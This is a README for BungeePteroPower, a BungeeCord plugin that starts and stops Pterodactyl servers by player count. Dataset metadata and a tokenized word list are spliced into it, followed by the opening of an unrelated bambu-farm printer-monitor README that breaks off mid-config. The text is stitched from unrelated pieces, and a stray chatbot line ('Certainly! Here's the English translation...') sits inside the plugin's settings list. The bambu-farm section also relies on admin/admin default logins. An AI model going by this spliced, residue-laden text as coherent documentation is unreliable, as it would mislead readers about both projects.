[![Spigotmc Version](https://img.shields.io/spiget/version/114883?logo=spigotmc&label=Spigotmc%20Version)](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/)
[![JitPack](https://img.shields.io/jitpack/version/com.github.Kamesuta/BungeePteroPower?logo=jitpack&label=JitPack)](https://jitpack.io/#Kamesuta/BungeePteroPower)  
[![Spigotmc Downloads](https://img.shields.io/spiget/downloads/114883?logo=spigotmc&label=Spigotmc%20Downloads)](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/)
[![bStats Servers](https://img.shields.io/bstats/servers/20917?label=bStats%20Servers)](https://bstats.org/plugin/bungeecord/BungeePteroPower/20917)  

BungeePteroPower is a plugin that can automatically start/stop servers based on the number of players.  
It can start and stop servers on the [Pterodactyl panel](https://pterodactyl.io/) when players join or leave the Bungeecord proxy server.  
This helps to save server resources and manage servers more efficiently.  

https://github.com/Kamesuta/BungeePteroPower/assets/16362824/019fdfc5-f0fc-4532-89f3-3342b5812593

## Key Features

- Automatically stops servers using Pterodactyl's API when there are no players on the server for a certain period of time.
    - The time until shutdown can be configured for each server.
- Automatically starts servers using Pterodactyl's API when players join the server.
- Permissions settings allow for specifying players who can manually start servers and players for whom automatic startup is enabled upon joining.
- You can reset the server from a backup when it shuts down.
    - This is useful when creating mini-game servers that reset once played.

![Overview](https://github.com/Kamesuta/BungeePteroPower/assets/16362824/3cece79e-b41a-4119-a6cd-4800dd4f705d)

## Download

- You can download it from [Spigot](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/) or [GitHub Releases](https://github.com/Kamesuta/BungeePteroPower/releases).

## Requirements

- Java 11 or higher
    - uses `java.net.http.HttpClient` in Java 11 for REST API communication with Pterodactyl.

## Getting Started

1. Obtain an API key in the Pterodactyl panel.
    - The client API key for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
2. Add the plugin to the BungeeCord server and start it.
3. Configure the [Required Settings](#required-settings) in the generated `plugins/BungeePteroPower/config.yml` file.
    ```yml
    # Pterodactyl configuration
    pterodactyl:
      # The URL of your pterodactyl panel
      # If you use Cloudflare Tunnel, you need to allow the ip in the bypass setting.
      url: ""https://panel.example.com""
      # The client api key of your pterodactyl panel. It starts with ""ptlc_"".
      # You can find the client api key in the ""API Credentials"" tab of the ""Account"" page.
      apiKey: ""ptlc_000000000000000000000000000000000000000000""
    
    # Per server configuration
    servers:
      pvp:
        # Pterodactyl server ID
        # You can find the Pterodactyl server ID in the URL of the server page.
        # For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.
        id: 1234abcd
        # The time in seconds to stop the server after the last player leaves.
        # If you don't want to stop the server automatically, set it to -1.
        # If you set it to 0, the server will be stopped immediately after the last player leaves.
        timeout: 30
    ```
4. Reload the config with the `/ptero reload` command.
5. Configure the [Permission Settings](#permission-settings).  
    (You **MUST** configure permission to use this plugin, otherwise the player will not be able to do anything!)  
    You can use either of the following methods.  
    - Use a permission plugin like [LuckPerms](https://luckperms.net/).
        1. For LuckPerms, use the following commands to set permissions:
            ```
            # The player can start all servers
            /lp user <player_name> permission set ptero.autostart.*
            # The player can start specific server
            /lp user <player_name> permission set ptero.autostart.<server_name>
            # All players can start all servers
            /lp group default permission set ptero.autostart.*
            ```
            ※ `<player_name>` refers to the player's name, `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
    - Use built-in permission settings.
        1. Open `config.yml`.
        2. Add the following settings to the `config.yml` file.
            ```yml
            permissions:
                default:
                # All players can start all server
                - ptero.autostart.*
                # All players can start specific server
                - ptero.autostart.<server_name>
            ```  
            ※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
        3. Restart the BungeeCord server.
  
## Usage

### Automatic Startup

- Servers will automatically start when players attempt to join each server on BungeeCord.
    - This feature is available only to players with the `ptero.autostart.<server_name>` permission.

### Manual Start/Stop

- Use the `/ptero start <server_name>` command to manually start a server.
    - This command is available only to players with the `ptero.start.<server_name>` permission.
- Use the `/ptero stop <server_name>` command to manually stop a server.
    - This command is available only to players with the `ptero.stop.<server_name>` permission.

※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.

### Reloading config.yml/Language files

- Use `/ptero reload` to reload the config.yml and language files.

## Configuration

The `config.yml` file includes the following settings, but not all items need to be configured.

### Required Settings

- `pterodactyl`: Configure settings for Pterodactyl, including URL and API key.
    - `url`: Set the URL of your Pterodactyl panel. (Example: https://panel.example.com/)
        - If you are using services like Cloudflare Tunnel, ensure proper bypass settings for IP-based communication.
    - `apiKey`: Set the client API key for Pterodactyl.
        - It begins with `ptlc_`.
        - Client API keys for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `id`: Set the server ID on Pterodactyl.
        - Server IDs on Pterodactyl can be found in the URL of the server page.
        - For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.

### Optional Settings

- `version`: Set the version of the plugin.
    - When updating the plugin, a warning will be displayed if this value does not match the plugin version.
    - A `config.new.yml` file will be generated, and manual migration of settings using a merge tool is required.
    - After migration, please change this value to the new version.
- `checkUpdate`: Set whether to check for plugin updates. The default is `true`.
- `language`: Set the language to be used. The default is English (`en`).
    - Refer to the comments in the [config file](./src/main/resources/config.yml) for supported languages.
- `startTimeout`: After starting a server with this plugin, it will stop the server if there are no players for a certain period. The unit is seconds.
    - After starting, the server will stop after the `startTimeout` plus the server's timeout duration.
    - Setting it to 1 keeps the server running until players join and leave.
- `powerControllerType`: Set the type of power controller to be used.
    - The built-in PowerController currently supports only `pterodactyl`, which operates Pterodactyl.
    - By adding add-ons, you can add your own custom PowerController.
      Certainly! Here's the English translation of the provided description:
- `useSynchronousPing`: This setting determines whether to perform **synchronous** pinging to the server during login. (Experimental feature)
    - When enabled, pinging the server during login will happen synchronously rather than asynchronously.
    - This allows displaying BungeePteroPower messages (`join_autostart_login` in messages.yml) instead of the ""Could not connect to a default or fallback server"" message upon login.
    - The default value is `false`. Enabling this can be useful if you want to set servers (such as lobby servers) to a suspended state in BungeePteroPower immediately after login.
- `startupJoin`: After server startup, it is used to automatically join players to the server and check the server's status.
    - `timeout`: Set the maximum waiting time for players to join after server startup.
        - Set this value to the maximum time it takes for the server to start.
        - Setting it to 0 disables this feature, and players will not automatically join after startup.
    - `joinDelay`: Once the server is pingable, wait the specified amount of seconds before sending the player to the server
        - This is useful to wait for plugins like Luckperms to fully load
        - If you set it to 0, the player will be connected as soon as the server is pingable
    - `pingInterval`: Set the interval for checking the server's status.
- `restoreOnStop`: Configure settings for the feature to reset the server from a backup when it is stopped.
    - `timeout`: Set the maximum waiting time after sending the stop signal for the server to stop. (The restore will be performed after the server stops)
    - `pingInterval`: Set the interval for checking if the server is offline after sending the stop signal.
- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `timeout`: When there are no players on the server, it will stop after a certain period. The unit is seconds.
    - `backupId`: The UUID of the backup to restore when the server stops.
        - If this setting is empty or removed, no restore from backup will be performed when the server stops.
        - Useful for servers that need to be reset after each game.

### Permission Settings

BungeePteroPower plugin allows fine-grained control over commands available to players for each server using permissions.

- `ptero.autostart.<server_name>`: Servers will automatically start when players join each server on BungeeCord for players with this permission.
- `ptero.start.<server_name>`: Allows the `/ptero start <server_name>` command to manually start a server.
    - If a player doesn't have `ptero.autostart.<server_name>` permission but has this permission, they will see a manual start button when they join the server.
- `ptero.stop.<server_name>`: Allows the `/ptero stop <server_name>` command to manually stop a server.
- `ptero.reload`: Allows the `/ptero reload` command to reload the config.

※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
※ Specify `*` for `<server_name>` to apply permissions to all servers.

### About Language Files

- You can set the language in config.yml using the language option.
    - Please refer to the comments in the config file for the supported languages.
- Upon startup, a file for the language set in config.yml will be generated.
    - This file allows you to define only the messages you want to change.
    - Messages that are not defined will be loaded from the language file set within the plugin.
- You can edit and then reload the plugin's language by using the `/ptero reload` command.
- Contributions via Pull Requests for additional language files are welcome.

## Information for Plugin Developers

### About Power Controllers

BungeePteroPower provides a Power Controller API for supporting platforms other than Pterodactyl.  
By creating add-ons, you can add power controllers for platforms other than Pterodactyl!

We also welcome pull requests for adding built-in power controllers!  
Ideally, we would like to support the following:
- Power controllers that can start servers locally
- Power controllers compatible with management software other than Pterodactyl.  
    For example, we would like to support the following:
    - PufferPanel
    - Minecraft Server Manager
    - MCSManager
    - MC Server Soft
    - AMP

### Creating Add-ons

- BungeePteroPower provides an API for integration with other plugins.
    - If you want to support platforms other than Pterodactyl, it is possible by implementing the API.
- You can use the BungeePteroPower API by adding dependencies.
    1. Add the JitPack repository inside the pom.xml of your add-on:
        ```xml
        <repositories>
            <repository>
                <id>jitpack.io</id>
                <url>https://jitpack.io</url>
            </repository>
        </repositories>
        ```
    2. Add BungeePteroPower as a dependency:
        ```xml
        <dependency>
            <groupId>com.github.Kamesuta</groupId>
            <artifactId>BungeePteroPower</artifactId>
            <version>version</version>
        </dependency>
        ```
    3. Add the dependency to your plugin.yml:
        ```yml
        depends:
          - BungeePteroPower
        ```
    4. Use the API:
        ```java
        import com.kamesuta.bungeepteropower.api.BungeePteroPowerAPI;

        public class YourPlugin extends JavaPlugin {
            @Override
            public void onEnable() {
                // Get an instance of BungeePteroPowerAPI
                BungeePteroPowerAPI api = BungeePteroPowerAPI.getInstance();
                // Register your custom PowerController
                api.registerPowerController(""your_service"", new YourPowerController());
            }
        }
        ```
        For an example implementation of a PowerController for Pterodactyl, please refer to [PterodactylController.java](./src/main/java/com/kamesuta/bungeepteropower/power/PterodactylController.java).
- If you want your PowerController to be added to BungeePteroPower, please send a pull request.

### Building

Pull requests are welcome for BungeePteroPower.  
You can build it using the following steps:

```bash
git clone https://github.com/Kamesuta/BungeePteroPower.git
cd BungeePteroPower
mvn install
```
- This plugin needs to be built with Java 11 or higher.
- After building, a `BungeePteroPower-<version>.jar` file will be generated in the `target` directory.

## About Statistics Data

BungeePteroPower collects anonymous statistical data using [bStats](https://bstats.org/).  
You can find the statistics data [here](https://bstats.org/plugin/bungeecord/BungeePteroPower/20917).

bStats is used to understand the usage of the plugin and help improve it.  
To disable the collection of statistical data, please set `enabled` to `false` in `plugins/bStats/config.yml`
",9,2,3,mit,8.0,"['bungeepteropower', 'bungeepteropower', 'plugin', 'automatically', 'server', 'based', 'number', 'player', 'start', 'stop', 'server', 'pterodactyl', 'panel', 'player', 'join', 'leave', 'bungeecord', 'proxy', 'server', 'help', 'save', 'server', 'resource', 'manage', 'server', 'efficiently', 'http', 'key', 'feature', 'automatically', 'stop', 'server', 'using', 'pterodactyl', 'api', 'player', 'server', 'certain', 'period', 'time', 'time', 'shutdown', 'configured', 'server', 'automatically', 'start', 'server', 'using', 'pterodactyl', 'api', 'player', 'join', 'server', 'permission', 'setting', 'allow', 'specifying', 'player', 'manually', 'start', 'server', 'player', 'automatic', 'startup', 'enabled', 'upon', 'joining', 'reset', 'server', 'backup', 'shuts', 'useful', 'creating', 'server', 'reset', 'played', 'download', 'download', 'spigot', 'github', 'releases', 'requirements', 'java', 'higher', 'us', 'java', 'rest', 'api', 'communication', 'pterodactyl', 'getting', 'started', 'obtain', 'api', 'key', 'pterodactyl', 'panel', 'client', 'api', 'key', 'pterodactyl', 'found', 'api', 'credential', 'tab', 'account', 'page', 'add', 'plugin', 'bungeecord', 'server', 'start', 'configure', 'required', 'setting', 'generated', 'file', 'reload', 'config', 'command', 'configure', 'permission', 'setting', 'must', 'configure', 'permission', 'use', 'plugin', 'otherwise', 'player', 'able', 'anything', 'use', 'either', 'following', 'method', 'use', 'permission', 'plugin', 'like', 'luckperms', 'luckperms', 'use', 'following', 'command', 'set', 'permission', 'refers', 'player', 'name', 'refers', 'server', 'name', 'specified', 'bungeecord', 'use', 'permission', 'setting', 'open', 'add', 'following', 'setting', 'file', 'refers', 'server', 'name', 'specified', 'bungeecord', 'restart', 'bungeecord', 'server', 'usage', 'automatic', 'startup', 'server', 'automatically', 'start', 'player', 'attempt', 'join', 'server', 'bungeecord', 'feature', 'available', 'player', 'permission', 'manual', 'use', 'command', 'manually', 'start', 'server', 'command', 'available', 'player', 'permission', 'use', 'command', 'manually', 'stop', 'server', 'command', 'available', 'player', 'permission', 'refers', 'server', 'name', 'specified', 'bungeecord', 'reloading', 'file', 'use', 'reload', 'language', 'file', 'configuration', 'file', 'includes', 'following', 'setting', 'item', 'need', 'configured', 'required', 'setting', 'configure', 'setting', 'pterodactyl', 'including', 'url', 'api', 'key', 'set', 'url', 'pterodactyl', 'panel', 'example', 'http', 'using', 'service', 'like', 'cloudflare', 'tunnel', 'ensure', 'proper', 'bypass', 'setting', 'communication', 'set', 'client', 'api', 'key', 'pterodactyl', 'begin', 'client', 'api', 'key', 'pterodactyl', 'found', 'api', 'credential', 'tab', 'account', 'page', 'configure', 'setting', 'server', 'set', 'server', 'id', 'time', 'automatic', 'shutdown', 'set', 'server', 'id', 'pterodactyl', 'server', 'id', 'pterodactyl', 'found', 'url', 'server', 'page', 'example', 'url', 'http', 'server', 'id', 'optional', 'setting', 'set', 'version', 'plugin', 'updating', 'plugin', 'warning', 'displayed', 'value', 'match', 'plugin', 'version', 'file', 'generated', 'manual', 'migration', 'setting', 'using', 'merge', 'tool', 'required', 'migration', 'please', 'change', 'value', 'new', 'version', 'set', 'whether', 'check', 'plugin', 'update', 'default', 'set', 'language', 'used', 'default', 'english', 'refer', 'comment', 'config', 'file', 'supported', 'language', 'starting', 'server', 'plugin', 'stop', 'server', 'player', 'certain', 'period', 'unit', 'second', 'starting', 'server', 'stop', 'plus', 'server', 'timeout', 'duration', 'setting', 'keep', 'server', 'running', 'player', 'join', 'leave', 'set', 'type', 'power', 'controller', 'used', 'powercontroller', 'currently', 'support', 'operates', 'pterodactyl', 'adding', 'add', 'custom', 'powercontroller', 'certainly', 'english', 'translation', 'provided', 'description', 'setting', 'determines', 'whether', 'perform', 'synchronous', 'pinging', 'server', 'login', 'experimental', 'feature', 'enabled', 'pinging', 'server', 'login', 'happen', 'synchronously', 'rather', 'asynchronously', 'allows', 'displaying', 'bungeepteropower', 'message', 'instead', 'could', 'connect', 'default', 'fallback', 'server', 'message', 'upon', 'login', 'default', 'value', 'enabling', 'useful', 'want', 'set', 'server', 'lobby', 'server', 'suspended', 'state', 'bungeepteropower', 'immediately', 'login', 'server', 'startup', 'used', 'automatically', 'join', 'player', 'server', 'check', 'server', 'status', 'set', 'maximum', 'waiting', 'time', 'player', 'join', 'server', 'startup', 'set', 'value', 'maximum', 'time', 'take', 'server', 'start', 'setting', 'disables', 'feature', 'player', 'automatically', 'join', 'startup', 'server', 'pingable', 'wait', 'specified', 'amount', 'second', 'sending', 'player', 'server', 'useful', 'wait', 'plugins', 'like', 'luckperms', 'fully', 'load', 'set', 'player', 'connected', 'soon', 'server', 'pingable', 'set', 'interval', 'checking', 'server', 'status', 'configure', 'setting', 'feature', 'reset', 'server', 'backup', 'stopped', 'set', 'maximum', 'waiting', 'time', 'sending', 'stop', 'signal', 'server', 'stop', 'restore', 'performed', 'server', 'stop', 'set', 'interval', 'checking', 'server', 'offline', 'sending', 'stop', 'signal', 'configure', 'setting', 'server', 'set', 'server', 'id', 'time', 'automatic', 'shutdown', 'player', 'server', 'stop', 'certain', 'period', 'unit', 'second', 'uuid', 'backup', 'restore', 'server', 'stop', 'setting', 'empty', 'removed', 'restore', 'backup', 'performed', 'server', 'stop', 'useful', 'server', 'need', 'reset', 'game', 'permission', 'setting', 'bungeepteropower', 'plugin', 'allows', 'control', 'command', 'available', 'player', 'server', 'using', 'permission', 'server', 'automatically', 'start', 'player', 'join', 'server', 'bungeecord', 'player', 'permission', 'allows', 'command', 'manually', 'start', 'server', 'player', 'permission', 'permission', 'see', 'manual', 'start', 'button', 'join', 'server', 'allows', 'command', 'manually', 'stop', 'server', 'allows', 'command', 'reload', 'config', 'refers', 'server', 'name', 'specified', 'bungeecord', 'specify', 'apply', 'permission', 'server', 'language', 'file', 'set', 'language', 'using', 'language', 'option', 'please', 'refer', 'comment', 'config', 'file', 'supported', 'language', 'upon', 'startup', 'file', 'language', 'set', 'generated', 'file', 'allows', 'define', 'message', 'want', 'change', 'message', 'defined', 'loaded', 'language', 'file', 'set', 'within', 'plugin', 'edit', 'reload', 'plugin', 'language', 'using', 'command', 'contribution', 'via', 'pull', 'requests', 'additional', 'language', 'file', 'welcome', 'information', 'plugin', 'developer', 'power', 'controller', 'bungeepteropower', 'provides', 'power', 'controller', 'api', 'supporting', 'platform', 'pterodactyl', 'creating', 'add', 'power', 'controller', 'platform', 'pterodactyl', 'also', 'welcome', 'pull', 'request', 'adding', 'power', 'controller', 'ideally', 'would', 'like', 'support', 'following', 'power', 'controller', 'start', 'server', 'locally', 'power', 'controller', 'compatible', 'management', 'software', 'pterodactyl', 'example', 'would', 'like', 'support', 'following', 'pufferpanel', 'minecraft', 'server', 'manager', 'mcsmanager', 'mc', 'server', 'soft', 'amp', 'creating', 'bungeepteropower', 'provides', 'api', 'integration', 'plugins', 'want', 'support', 'platform', 'pterodactyl', 'possible', 'implementing', 'api', 'use', 'bungeepteropower', 'api', 'adding', 'dependency', 'add', 'jitpack', 'repository', 'inside', 'add', 'bungeepteropower', 'dependency', 'add', 'dependency', 'use', 'api', 'example', 'implementation', 'powercontroller', 'pterodactyl', 'please', 'refer', 'want', 'powercontroller', 'added', 'bungeepteropower', 'please', 'send', 'pull', 'request', 'building', 'pull', 'request', 'welcome', 'bungeepteropower', 'build', 'using', 'following', 'step', 'plugin', 'need', 'built', 'java', 'higher', 'building', 'file', 'generated', 'directory', 'statistic', 'data', 'bungeepteropower', 'collect', 'anonymous', 'statistical', 'data', 'using', 'bstats', 'find', 'statistic', 'data', 'bstats', 'used', 'understand', 'usage', 'plugin', 'help', 'improve', 'disable', 'collection', 'statistical', 'data', 'please', 'set']","['server', 'player', 'set', 'setting', 'pterodactyl']",9,0,0,"['bungeepteropower', 'key', 'feature', 'download', 'requirement', 'get', 'start', 'pterodactyl', 'configuration', 'the', 'url', 'pterodactyl', 'panel', 'if', 'use', 'cloudflare', 'tunnel', 'need', 'allow', 'ip', 'bypass', 'setting', 'the', 'client', 'api', 'key', 'pterodactyl', 'panel', 'it', 'start', 'you', 'find', 'client', 'api', 'key', 'api', 'credential', 'tab', 'account', 'page', 'per', 'server', 'configuration', 'pterodactyl', 'server', 'id', 'you', 'find', 'pterodactyl', 'server', 'id', 'url', 'server', 'page', 'for', 'example', 'url', 'http', 'server', 'id', 'the', 'time', 'second', 'stop', 'server', 'last', 'player', 'leaf', 'if', 'want', 'stop', 'server', 'automatically', 'set', 'if', 'set', 'server', 'stop', 'immediately', 'last', 'player', 'leaf', 'the', 'player', 'start', 'server', 'the', 'player', 'start', 'specific', 'server', 'all', 'player', 'start', 'server', 'all', 'player', 'start', 'server', 'all', 'player', 'start', 'specific', 'server', 'usage', 'automatic', 'startup', 'manual', 'reload', 'file', 'configuration', 'require', 'setting', 'optional', 'setting', 'permission', 'setting', 'about', 'language', 'file', 'information', 'plugin', 'developer', 'about', 'power', 'controller', 'create', 'building', 'about', 'statistic', 'data']",36,"['server', 'start', 'player', 'pterodactyl', 'the']",8,0.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0,15607,14.36986301369863,5.308865586272641,"['LogoArt -> https://github.com/Kamesuta/BungeePteroPower/assets/16362824/e8914f79-806b-436c-a0e6-e4eaf8ad5eca', '![License: MIT -> https://img.shields.io/github/license/Kamesuta/BungeePteroPower?label=License', '![Spigotmc Version -> https://img.shields.io/spiget/version/114883?logo=spigotmc&label=Spigotmc%20Version', '![JitPack -> https://img.shields.io/jitpack/version/com.github.Kamesuta/BungeePteroPower?logo=jitpack&label=JitPack', '![Spigotmc Downloads -> https://img.shields.io/spiget/downloads/114883?logo=spigotmc&label=Spigotmc%20Downloads', '![bStats Servers -> https://img.shields.io/bstats/servers/20917?label=bStats%20Servers', 'Pterodactyl panel -> https://pterodactyl.io/', 'Overview -> https://github.com/Kamesuta/BungeePteroPower/assets/16362824/3cece79e-b41a-4119-a6cd-4800dd4f705d', 'Spigot -> https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/', 'GitHub Releases -> https://github.com/Kamesuta/BungeePteroPower/releases', 'LuckPerms -> https://luckperms.net/', 'bStats -> https://bstats.org/', 'here -> https://bstats.org/plugin/bungeecord/BungeePteroPower/20917']",13
TFyre/bambu-farm,main,"# Cannot print with latest firmware
> [!IMPORTANT]  
> https://wiki.bambulab.com/en/p1/manual/p1p-firmware-release-history
>
> Bambulab decided to block printing via MQTT unless you enable lanmode only.
>
> Consider downgrading firmware Reference [!142](https://github.com/TFyre/bambu-farm/issues/142)
>
> **OR**
>
> Check the [Cloud Section](#cloud-section) about enabling cloud mode


# Bambu Farm
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/tfyre)


Web based application to monitor multiple bambu printers using mqtt / ftp / rtsp (**no custom firmware required**)

Technologies used:
* Java 21 https://www.azul.com/
* Quarkus https://quarkus.io/
* Vaadin https://vaadin.com/

# Features / Supported Devices

| Feature | A1 | A1 Mini | P1P | P1S | X1C|
|--|:--:|:--:|:--:|:--:|:--:|
|**Remote View**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>3</sup></li></ul>|
|**Upload to SD card**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**Print .3mf from SD card**<sup>1</sup>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**Print .gcode from SD card**|?|?|?|?|?|
|**Batch Printing**<sup>4</sup>|?|?|?|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**AMS**|?|?|?|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|
|**Send Custom GCode**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|

1. **Currently only .3mf sliced projects are supported.**
  > In Bambu Studio/Orca slicer, make sure to slice the place and then use the ""File -> Export -> Export plate sliced file"". This creates a `.3mf` project with embedded `.gcode` plate.
2. **FTPS Connections needs SSL Session Reuse via [Bouncy Castle](#bouncy-castle)**
> Without enabling bouncy castle, you will see `552 SSL connection failed: session resuse required`
3. Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.
4. **Batch Priting** allows you to upload a single/multi sliced .3mf and select which plate to send to multiple printers, each with their own filament mapping.

# Screenshots

* Dashboard
![Desktop browser](/docs/bambufarm1.jpg)
* Batch printing
![Batch Printing](/docs/batchprint.png)

*More screenshots in [docs](/docs)*

# I just want to run it

* Make sure you have Java 21 installed, verify with `java -version`
```bash
[user@build:~]# java -version
openjdk version ""21.0.1"" 2023-10-17 LTS
OpenJDK Runtime Environment Zulu21.30+15-CA (build 21.0.1+12-LTS)
OpenJDK 64-Bit Server VM Zulu21.30+15-CA (build 21.0.1+12-LTS, mixed mode, sharing)
```
* Download the latest `bambu-web-*-runner.jar` from [releases](https://github.com/TFyre/bambu-farm/releases/latest) into a new folder (or use the 1 liner below):
```bash
curl -s https://api.github.com/repos/tfyre/bambu-farm/releases/latest \
  | grep browser_download_url | cut -d'""' -f4 | xargs curl -LO
```
* Create a `.env` config file from [Minimal Config](#minimal-config)
  * *Check out the [Full Config Options](#full-config-options) section if you want to tweak some settings*
* Run with `java -jar bambu-web-x.x.x-runner.jar`
```bash
[user@build:~]# java -jar bambu-web-1.0.1-runner.jar
__  ____  __  _____   ___  __ ____  ______
 --/ __ \/ / / / _ | / _ \/ //_/ / / / __/
 -/ /_/ / /_/ / __ |/ , _/ ,< / /_/ /\ \
--\___\_\____/_/ |_/_/|_/_/|_|\____/___/
2024-01-23 08:49:05,586 INFO  [io.und.servlet] (main) Initializing AtmosphereFramework
...
...
2024-01-23 08:49:05,666 INFO  [com.vaa.flo.ser.DefaultDeploymentConfiguration] (main) Vaadin is running in production mode.
2024-01-23 08:49:05,912 INFO  [org.apa.cam.qua.cor.CamelBootstrapRecorder] (main) Bootstrap runtime: org.apache.camel.quarkus.main.CamelMainRuntime
2024-01-23 08:49:05,913 INFO  [org.apa.cam.mai.MainSupport] (main) Apache Camel (Main) 4.2.0 is starting
...
...
2024-01-23 08:49:06,029 INFO  [com.tfy.bam.cam.CamelController] (main) configured
2024-01-23 08:49:06,074 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Apache Camel 4.2.0 (camel-1) is starting
2024-01-23 08:49:06,081 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Routes startup (total:10 started:0 disabled:10)
...
...
2024-01-23 08:49:06,085 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Apache Camel 4.2.0 (camel-1) started in 10ms (build:0ms init:0ms start:10ms)
2024-01-23 08:49:06,193 INFO  [io.quarkus] (main) bambu-web 1.0.1 on JVM (powered by Quarkus 3.6.6) started in 1.421s. Listening on: http://0.0.0.0:8084
2024-01-23 08:49:06,194 INFO  [io.quarkus] (main) Profile prod activated.
2024-01-23 08:49:06,194 INFO  [io.quarkus] (main) Installed features: [camel-core, camel-direct, camel-paho, cdi, resteasy-reactive, resteasy-reactive-jackson, 
scheduler, security, servlet, smallrye-context-propagation, vaadin-quarkus, vertx, websockets, websockets-client]
```
* If starting correctly, it will show `Routes startup (total:10 started:0 disabled:10)` with a number that is 2x your printer count
* Head over to http://127.0.0.1:8080 and log in with `admin` / `admin`

# Building & Running

Building:
```bash
mvn clean install -Pproduction
```

Create a new directory and copy `bambu/target/bambu-web-1.0.0-runner.jar` into it, example:
```bash
tfyre@fsteyn-pc:/mnt/c/bambu-farm$ ls -al
total 64264
drwxrwxrwx 1 tfyre tfyre     4096 Jan 17 16:47 .
drwxrwxrwx 1 tfyre tfyre     4096 Jan 18 20:42 ..
-rw-rw-rw- 1 tfyre tfyre     4557 Jan 18 14:01 .env
-rw-rw-rw- 1 tfyre tfyre 65796193 Jan 18 20:38 bambu-web-1.0.0-runner.jar
```

Running
```bash
java -jar bambu-web-1.0.0-runner.jar
```

You can now access it via http://127.0.0.1:8080 (username: admin / password: admin)

# Running as a service

Refer to [README.service.md](/docs/README.service.md)

# Example Config

## Minimal config

**!!Remeber to replace `REPLACE_*` fields!!**

Create an `.env` file with  the following config:
```properties
quarkus.http.host=0.0.0.0
quarkus.http.port=8080

bambu.printers.myprinter1.device-id=REPLACE_WITH_DEVICE_SERIAL
bambu.printers.myprinter1.access-code=REPLACE_WITH_DEVICE_ACCESSCODE
bambu.printers.myprinter1.ip=REPLACE_WITH_DEVICE_IP

bambu.users.admin.password=admin
bambu.users.admin.role=admin
```

## Full Config Options

**All default options are displayed (only add to the config if you want to change)**

### Dark Mode
```properties
# Gobal
bambu.dark-mode=false
# Per user (will default to global if omitted)
bambu.users.myUserName.dark-mode=false
```

### Printer section
```properties
bambu.printers.myprinter1.enabled=true
bambu.printers.myprinter1.name=Name With Spaces
bambu.printers.myprinter1.device-id=REPLACE_WITH_DEVICE_SERIAL
bambu.printers.myprinter1.username=bblp
bambu.printers.myprinter1.access-code=REPLACE_WITH_DEVICE_ACCESSCODE
bambu.printers.myprinter1.ip=REPLACE_WITH_DEVICE_IP
bambu.printers.myprinter1.use-ams=true
bambu.printers.myprinter1.timelapse=true
bambu.printers.myprinter1.bed-levelling=true
bambu.printers.myprinter1.flow-calibration=true
bambu.printers.myprinter1.vibration-calibration=true
bambu.printers.myprinter1.model=unknown / a1 / a1mini / p1p / p1s / x1c
bambu.printers.myprinter1.mqtt.port=8883
bambu.printers.myprinter1.mqtt.url=ssl://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.mqtt.port}
bambu.printers.myprinter1.mqtt.report-topic=device/${bambu.printers.myprinter1.device-id}/report
bambu.printers.myprinter1.mqtt.request-topic=device/${bambu.printers.myprinter1.device-id}/request
#Requesting full status interval
bambu.printers.myprinter1.mqtt.full-status=10m
bambu.printers.myprinter1.ftp.port=990
bambu.printers.myprinter1.ftp.url=ftps://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.ftp.port}
bambu.printers.myprinter1.ftp.log-commands=false
bambu.printers.myprinter1.stream.port=6000
bambu.printers.myprinter1.stream.live-view=false
bambu.printers.myprinter1.stream.url=ssl://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.stream.port}
#Restart stream if no images received interval
bambu.printers.myprinter1.stream.watch-dog=5m
```

### Cloud Section

Enable MQTT connection via cloud instead of directly to printer. You can either provide the username/password or a access token.

* Option 1 - username/password

Provide the username and password for https://bambulab.com/ in the format below

* Option 2 - access token

The access token can be fetched from your browser cookies or a 1 liner curl
```bash
curl -v -X POST -H 'Content-Type: application/json' -d '{""account"":""YOUR_USER_NAME"",""password"":""YOUR_PASSWORD""}' https://bambulab.com/api/sign-in/form 2>&1 | grep token= | awk '{print$3}'
```

Configuration:

```properties
bambu.cloud.enabled=true

# Option1: Let bambufarm login and fetch token
bambu.cloud.login.username=YOUR_LOGIN_USER
bambu.cloud.login.password=YOUR_LOGIN_PASSWORD

# Option2: fetch token via curl and paste here
